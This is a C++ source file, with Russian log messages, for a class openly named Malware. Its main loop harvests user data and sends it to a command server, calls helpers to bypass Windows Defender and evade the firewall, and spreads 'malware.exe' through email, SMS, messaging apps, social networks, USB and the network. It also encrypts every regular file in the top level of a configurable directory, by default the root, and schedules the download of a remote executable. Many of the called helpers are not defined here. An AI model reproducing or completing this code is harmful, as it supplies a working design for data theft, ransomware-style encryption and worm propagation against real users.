#include "hub.h"
#include "UserDataCollector.h"
#include "StealthUtils.h"
#include "Logger.h"
#include "Config.h"
#include "EncryptionUtils.h"
#include "EmailSender.h"
#include "SMSSender.h"
#include "TelegramSender.h"
#include "WhatsAppSender.h"
#include "FacebookSender.h"
#include "InstagramSender.h"
#include "PhishingManager.h"
#include "NetworkManager.h"
#include "USBSpreader.h"
#include "NetworkSpreader.h"
#include "CaptchaSolver.h"
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <filesystem>
#include <vector>

Malware::Malware(const std::string &configFilePath) : configFilePath(configFilePath) {
    if (!Config::load(configFilePath)) {
        throw std::runtime_error("Не удалось загрузить файл конфигурации");
    }
    Logger::init(Config::get("log_file", "logs/malware_log.txt"));
}

void Malware::execute() {
    try {
        BotManager botManager;
        BotScheduler botScheduler;
        botManager.setUpCluster(Config::get("cluster_config", "config/cluster.conf"));

        // Планирование начальных задач
        scheduleInitialTasks(botManager, botScheduler);

        while (!shouldStopExecution()) {
            collectUserData();
            hideFromAntivirus();
            selfSpread();
            encryptFiles(Config::get("encrypt_directory", "/"));
            botManager.monitorBots();
            botScheduler.runScheduledTasks();
            sleepRandomTime();
        }
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Ошибка выполнения: ") + e.what());
    }
}

void Malware::scheduleInitialTasks(BotManager &botManager, BotScheduler &botScheduler) {
    std::map<std::string, std::string> params = {{"url", "http://lokalhost/ml.exe"}, {"destination", "/tmp/ml.exe"}};
    Bot bot("bot1", Bot::DOWNLOAD, Bot::HIGH, params, {});
    botManager.addBot(bot);

    // Планирование задачи с задержкой
    botScheduler.runTaskWithDelay(bot, 10, 1);
}

void Malware::collectUserData() {
    try {
        UserDataCollector collector;
        std::string userData = collector.collect();
        sendToServer(userData);
        logActivity("Собраны данные пользователя");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось собрать данные пользователя: ") + e.what());
    }
}

void Malware::hideFromAntivirus() {
    try {
        // Скрытие процесса и обход фаервола 
        StealthUtils::bypassAV("Windows Defender");
        StealthUtils::evadeFirewall({"80", "443"});
        logActivity("Скрытие от антивируса");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось скрыться от антивируса: ") + e.what());
    }
}

void Malware::logActivity(const std::string &activity) {
    Logger::log(Logger::INFO, activity);
}

void Malware::selfSpread() {
    try {
        spreadViaEmail();
        spreadViaSMS();
        spreadViaTelegram();
        spreadViaWhatsApp();
        spreadViaFacebook();
        spreadViaInstagram();
        spreadViaUSB();
        spreadViaNetwork();
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить малварь: ") + e.what());
    }
}

void Malware::spreadViaEmail() {
    try {
        EmailSender emailSender(Config::get("email_config", "config/email.conf"));
        std::vector<std::string> recipients = {"victim@example.com"};
        emailSender.sendMessageWithAttachment(recipients, "Check this out!", "malware.exe");
        logActivity("Распространение через email");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через email: ") + e.what());
    }
}

void Malware::spreadViaSMS() {
    try {
        SMSSender smsSender(Config::get("sms_token", "your-sms-token"));
        std::vector<std::string> recipients = {"+1234567890"};
        smsSender.sendMessageWithAttachment(recipients[0], "Check this out!", "malware.exe");
        logActivity("Распространение через SMS");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через SMS: ") + e.what());
    }
}

void Malware::spreadViaTelegram() {
    try {
        TelegramSender telegramSender(Config::get("telegram_token", "your-telegram-token"));
        std::string recipient = "123456789";
        telegramSender.sendMessageWithAttachment(recipient, "Check this out!", "malware.exe");
        logActivity("Распространение через Telegram");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через Telegram: ") + e.what());
    }
}

void Malware::spreadViaWhatsApp() {
    try {
        WhatsAppSender whatsappSender(Config::get("whatsapp_token", "your-whatsapp-token"));
        std::string recipient = "123456789";
        whatsappSender.sendMessageWithAttachment(recipient, "Check this out!", "malware.exe");
        logActivity("Распространение через WhatsApp");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через WhatsApp: ") + e.what());
    }
}

void Malware::spreadViaFacebook() {
    try {
        FacebookSender facebookSender(Config::get("facebook_token", "your-facebook-token"));
        std::string recipient = "123456789";
        facebookSender.sendMessageWithAttachment(recipient, "Check this out!", "malware.exe");
        logActivity("Распространение через Facebook");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через Facebook: ") + e.what());
    }
}

void Malware::spreadViaInstagram() {
    try {
        InstagramSender instagramSender(Config::get("instagram_token", "your-instagram-token"));
        std::string recipient = "123456789";
        instagramSender.sendMessageWithAttachment(recipient, "Check this out!", "malware.exe");
        logActivity("Распространение через Instagram");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через Instagram: ") + e.what());
    }
}

void Malware::spreadViaUSB() {
    try {
        USBSpreader usbSpreader;
        usbSpreader.configure(Config::get("usb_config", "config/usb.conf"));
        usbSpreader.spread("malware.exe");
        logActivity("Распространение через USB");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через USB: ") + e.what());
    }
}

void Malware::spreadViaNetwork() {
    try {
        NetworkSpreader networkSpreader;
        networkSpreader.configure(Config::get("network_config", "config/network.conf"));
                networkSpreader.spread("malware.exe");
        logActivity("Распространение через сеть");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось распространить через сеть: ") + e.what());
    }
}

void Malware::encryptFiles(const std::string &directory) {
    try {
        for (const auto &entry : std::filesystem::directory_iterator(directory)) {
            if (!std::filesystem::is_regular_file(entry.status())) continue;

            std::ifstream inputFile(entry.path(), std::ios::binary);
            std::ofstream outputFile(entry.path().string() + ".enc", std::ios::binary);

            std::string fileData((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
            std::string encryptedData = encrypt(fileData);

            outputFile.write(encryptedData.c_str(), encryptedData.size());
        }
        logActivity("Файлы зашифрованы в директории: " + directory);
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось зашифровать файлы: ") + e.what());
    }
}

std::string Malware::encrypt(const std::string &data) {
    return EncryptionUtils::encrypt(data);
}

void Malware::sendToServer(const std::string &data) {
    try {
        NetworkManager networkManager;
        networkManager.connect(Config::get("server_address", "127.0.0.1"), Config::get<int>("server_port", 8080));
        networkManager.sendData(data);
        networkManager.disconnect();
        logActivity("Данные отправлены на сервер");
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось отправить данные на сервер: ") + e.what());
    }
}

bool Malware::shouldStopExecution() {
    try {
        NetworkManager networkManager;
        networkManager.connect(Config::get("server_address", "127.0.0.1"), Config::get<int>("server_port", 8080));
        std::string response = networkManager.receiveData();
        networkManager.disconnect();
        return response == "STOP";
    } catch (const std::exception &e) {
        Logger::log(Logger::ERROR, std::string("Не удалось проверить команду остановки выполнения: ") + e.what());
        return false;
    }
}

void Malware::sleepRandomTime() {
    srand(static_cast<unsigned int>(time(0)));
    int sleepTime = rand() % 10 + 1;
    std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
}















